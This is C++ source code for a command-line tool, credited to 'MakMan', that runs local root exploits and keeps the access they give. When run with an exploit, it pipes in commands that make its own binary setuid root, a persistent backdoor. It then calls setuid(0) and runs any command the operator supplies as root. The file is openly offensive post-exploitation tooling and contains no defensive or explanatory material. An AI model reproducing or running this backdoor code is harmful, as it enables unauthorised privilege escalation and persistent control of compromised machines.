#include <iostream>
#include <string.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

    using namespace std;

    int     main            ( int argc, char **arg );
    int     exec_command    ( char const action[], char const * cmd );
    void    banner          ( );
    void    menu            ( char arg[] );

    void    banner()
    {
        cout << endl << "By MakMan -- http://mukarramkhalid.com"                    << endl;
    }

    void    menu( char arg[] )
    {
        cout << "Expected arguments as : " << arg << " [OPTIONS]"                   << endl;
        cout << "--  Execute your local root exploit"                               << endl;
        cout << "        --exploit = Exploit Name Here OR --e = Exploit Name Here"  << endl;
        cout << "--  To execute command as root user."                              << endl;
        cout << "        --command = Command Here OR --c = Command Here"            << endl;
        cout << "--  To print this menu."                                           << endl;
        cout << "        --help OR --h To print this menu"                          << endl;
    }


    int     exec_command( char const action[], char const * cmd )
    {
        FILE          * fp;
        char            path[1035];
        char const    * root_backdoor;
        root_backdoor = "chown root makman;chmod u+s makman;whoami;id\n";

        if ( action == "e" )
        {
            fp = popen( cmd, "w" );
            fwrite( "whoami;", 1, 8, fp );
            fwrite( root_backdoor, 1, strlen( root_backdoor ), fp );
        }

        else if ( action == "c" )
        {
            fp = popen( cmd, "r" );
        }

        if ( fp == NULL )
        {
            cout << "Failed to run" << endl;
            return 0;
        }

        while ( fgets( path, sizeof( path )-1, fp ) != NULL )
        {
            cout << path            << endl;
        }

        pclose( fp );
       
        return 1;
        

    }


    int     main( int argc, char **argv )

    {
        banner();
        char const * exploit="none", * command="none";
        
        if ( argc <= 1 )
        {
            menu( argv[0] );
        }
        
        int             c;
        const char      short_opt[]= "he:c:";
        struct option   long_opt[] =
        {
            { "help",          no_argument,       NULL, 'h' },
            { "exploit",       required_argument, NULL, 'e' },
            { "command",       required_argument, NULL, 'c' },
            {  NULL,           0,                 NULL,  0  }
        };

        while ( ( c = getopt_long( argc, argv, short_opt, long_opt, NULL ) ) != -1 )
        {
            switch( c )
            {
                case -1:
                case 0:
                    break;
                
                case 'e':
                    exploit = optarg;
                    break;

                case 'c':
                    command = optarg;
                    break;
                
                case 'h':
                    menu(argv[0]);
                    return(0);

                default:
                    menu(argv[0]);
                    return(0);
            };
        };
    
        setuid( 0 );

        if ( exploit != "none" && command == "none" )
        {
            exec_command( "e", exploit );
        }
        else if ( exploit == "none" && command != "none" )
        {
            exec_command( "c", command );
        }

        return 0;

    }
